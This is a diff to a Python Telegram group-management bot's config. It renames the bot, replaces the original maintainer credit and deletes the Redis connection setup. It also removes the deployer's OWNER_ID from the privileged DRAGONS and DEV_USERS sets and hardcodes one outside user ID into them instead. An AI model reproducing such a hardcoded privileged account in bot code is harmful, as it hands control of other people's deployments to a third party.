@@ -42,12 +42,12 @@ logging.getLogger("ptbcontrib.postgres_persistence.postgrespersistence").setLeve
     logging.WARNING
 )
 
-LOGGER = logging.getLogger("[AVENGER]")
+LOGGER = logging.getLogger("[SCARLET]")
 LOGGER.info(
-    "AVENGER is starting. | A BotsClub Project Parts. | Licensed under GPLv3."
+    "SCARLET is starting. | A BotsClub Project Parts. | Licensed under GPLv3."
 )
 LOGGER.info("Not affiliated to other anime or Villain in any way whatsoever.")
-LOGGER.info("Project maintained by: github.com/BotsClub (t.me/mkspali)")
+LOGGER.info("Project maintained by: github.com/TEAMDARKWEB")
 
 if sys.version_info[0] < 3 or sys.version_info[1] < 9:
     LOGGER.error(
@@ -223,23 +223,10 @@ else:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
 
-DRAGONS.add(OWNER_ID)
-DRAGONS.add(1761766352)
-DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1761766352)
-
-
-REDIS = StrictRedis.from_url(REDIS_URL, decode_responses=True)
-try:
-    REDIS.ping()
-    LOGGER.info("Connecting To Redis Database")
-except BaseException:
-    raise Exception(
-        "[AVENGER Error]: Your Redis Database Is Not Alive, Please Check Again."
-    )
-finally:
-    REDIS.ping()
-    LOGGER.info("Connection To The Redis Database Established Successfully!")
+DRAGONS.add(1858407508)
+DRAGONS.add(1858407508)
+DEV_USERS.add(1858407508)
+DEV_USERS.add(1858407508)
 
 
 if not SPAMWATCH_API:
